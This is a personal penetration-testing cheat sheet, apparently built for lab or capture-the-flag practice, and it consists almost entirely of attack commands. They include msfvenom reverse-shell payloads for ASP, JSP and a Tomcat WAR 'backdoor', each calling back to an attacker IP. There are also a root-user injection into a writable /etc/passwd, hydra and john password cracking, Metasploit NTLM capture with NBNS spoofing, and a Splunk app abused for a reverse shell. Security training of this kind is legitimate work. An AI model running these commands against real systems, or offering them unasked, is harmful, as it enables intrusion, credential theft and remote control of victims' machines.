                -------------------------------
                ----- PENTEST CHEAT SHEET -----
                -------------------------------

************
** LOCATE **
************

  updatdb && locate {file_name}
  find / -name {file_name}

*************
** SERVICE **
*************

  systemctl start/stop ssh
  systemctl enable/disable ssh
  netstat -antp | grep sshd // to verify it is working

***********
** RECON **
***********

  nmap -sV -sC -oA {filename} {remote_ip}
    -sV:              version scan
    -sC:              safe script scan
    -oA {filename}:   output in 3 formats in {filename} 

  nmap -sn {remote_ip} // ping scan, useful for host discovery
    /!\ use sudo, otherwise ping scan will likely fail

  nmap
    -T5: agressive
    -T4: fast
    -T3: normal
    -T2: polite (eg. 400ms delay between packets for a single host)
    -T1: slow
    -T0: very slow

  dirb {http://remote_ip} ~/github/SecLists/Discovery/Web-Content/big.txt -r -o {filename} 
    -r:               don't do recursive search
    -o:               output in {filename}

  wpscan // wordpress

  droopescan scan drupal -h http://host.com // drupal

  curl -i {remote_ip} // check for http header

  nikto -host {remote_ip} // web vuln scanner
  
  MISC: 
    - check for virtual hosting
    - check html code for smth strange

  ssh user enumeration:
    https://www.exploit-db.com/exploits/45233

***************  
** WORDPRESS **
***************  

  http://website/wp-content/uploads/YEAR/MONTH/filename.ext
    // regular file upload location

**********  
** SQLI **
**********  

  sqlmap -r login.req --level 5 --risk 3 --threads 20

*********
** SMB **
*********

  port 139, 445

  nmap --script smb-vuln* -p445 {remote_ip}

  msfconsole
    > use auxiliary/scanner/smb/smb_version // smb version detection

  enum4linux -a {remote_ip}

  smbclient -L //{remote_ip} // list smb shares
  OR
  smbmap -H {remote_ip} // gives shares permission
    // ADMIN$ and IPC$ are default shares

  smbclient //{remote_ip}/{share_name} -N // interactive smb shell
  smbclient //{remote_ip}/{share_name} -W corp.local -U user // with user and domain

  **/!\** Check for rootfs symlink

  mount [-t cifs] //{remote_ip}/{share_name} /mnt/smb [-o vers=1.0]

***********
** MYSQL **
***********

  test ms-sql login/password on a target
    auxiliary/scanner/mssql/mssql_login

*****************
** FILE UPLOAD **
*****************

  webdav upload with curl:
    curl -T ~/tools/bananes.jpeg http://{remote_ip}

  cadaver {remote_ip} // interact with webdav

  davtest --url http//{url} // don't forget http

  ASP payload
    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.80 LPORT=443 -f asp > shell.asp

  JAVA JSP payload
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw > shell.jsp

  file upload filter:
    - php5, PHp, php.jpg, ...
    - mime type
    - ...

******************
** VULN SEEKING **
******************

  searchsploit "techno_to_look_at"
  
  MISC:
    - check for file upload

**************
** BINARIES **
**************

  strings -t x {binary}
    -t x:             print strings address in hex  

  binwalk

  steghide

  stegbrute
  
  MISC:
    - searchmem my_string in gdb to look for my_string
    - strings

******************
** POST EXPLOIT **
******************

  /dev/shm // writeable directory    

  $ python3 -m http.server 8080 // for file transfer from host to target
  then
  $ wget http://[HOST_IP]:8080/file_to_transfer -O /tmp/dir // on target
  or
  $ curl [HOST_IP]:8080/file_to_transfer > /tmp/dir

**************
** PRIV ESC **
**************

  find / -perm -4000 2>/dev/null

  sudo -l
    -l:               print the allowed commands for the invoking user

  MISC:
    - ch
    - openssl passwd --help // If /etc/passwd is writeable

  in case /etc/passwd is world writeable:
    - give hash of "foo"
    $ perl -le 'print crypt("foo", "aa")'
    aaKNIEDOaueR6

    - add toto user as root, with "foo" password
    $ echo toto:aaKNIEDOaueR6:0:0:toto:/root:/bin/bash >> /etc/passwd

    - login as toto:foo (with ssh for instance)

  to compile a binary on a x86 machine:
    gcc -m32 -Wl,--hash-style=both -o exploit exploit.c

*********
** DNS **
*********

  nslookup
    > server {dns_ip} // change the dns server to be @dns_ip
    > {dns_ip} // lookup name at {dns_ip}

  dig axfr @{dns_ip} {dns_zone_name} // dns zone transfer
   
  !!! zone transfer require tcp:53 port !!!

*******************
** GET PTY SHELL **
*******************

  python -c 'import pty; pty.spawn("/bin/sh");'
  ctrl-z
  stty raw -echo
  fg

******************
** IMG METADATA **
******************

  exiftool

****************
** BRUTEFORCE **
****************

  hydra // bruteforce given a user list and a pwd list
  hydra -L user_list -P pass_list 10.143.2.14 ssh
  cewl
  crunch // generate pw list

  unshadow passwd_file shadow_file > passwords.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

****************
** METASPLOIT **
****************

  tomcat
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.80 LPORT=443 -f war > backdoor.war

*********
** FTP **
*********

  in case ftp is not working because you are behind nat or whatever, try ftp -p (passive mode)

  if there is anonymous login, recursively get all files:
  wget --recursive --user=anonymous --password=aa ftp://172.16.1.201

***************
** RESPONDER **
***************

  use auxiliary/server/capture/smb
  set CAINPWFILE /path/to/cain.smb.pw
  set JOHNPWFILE /path/to/john.smb.pw
  run
  use auxiliary/server/capture/http_ntlm
  set CAINPWFILE /path/to/cain.http.pw
  set JOHNPWFILE /path/to/john.http.pw
  set URIPATH /
  set SRVPORT 80
  run
  use auxiliary/spoof/nbns/nbns_response
  set SPOOFIP X.X.X.X
  run

  // check login

  use auxiliary/scanner/smb/smb_login
  set BLANK_PASSWORDS false
  set RHOSTS x
  set SMBDomain DOMAIN
  set USER_AS_PASS false
  set SMBUser xxxxxxxx
  set SMBPass xxxxxxxx
  run


************
** SPLUNK **
************

    - reverse shell in Splunk (https://github.com/TBGSecurity/splunk_shells)
        - download https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz
        - login in splunk
        - navigate to the “App: Search & Reporting” option and click on "Manage Apps"
        - click on the "Install app from file" option
        - upload the file downloaded in the first step and restart Splunk when asked
        - once restarted, go to apps tab again, Find your installed archive (weaponize Splunk for pentesting and red teaming)
        - click on permissions and ensure the last permission "Sharing for config file-only objects" has "all apps" selected
        - go to search option in Splunk
        - setup listener on host, for instance "nc -lvp 31337" or using msf (see MSF section)
        - search "| revshell std [HOST_IP] 31337" (mind the "|")
        - if you're getting a weird shell, try to setup the listener with "(cat | nc -lvp 31337)"
    
  reverse shell post auth 

*********
** MSF **
*********

    - setup a basic reverse shell
        $ use multi/handler
        $ set LHOST 
        $ set LPORT
        $ exploit -j
        $ sessions 1

    - upgrade a shell to meterpreter
        $ use post/multi/manage/shell_to_meterpreter
        $ set session 1
        $ exploit

**********
** TODO **
**********

  add seclists (from github) on vm
  padBuster
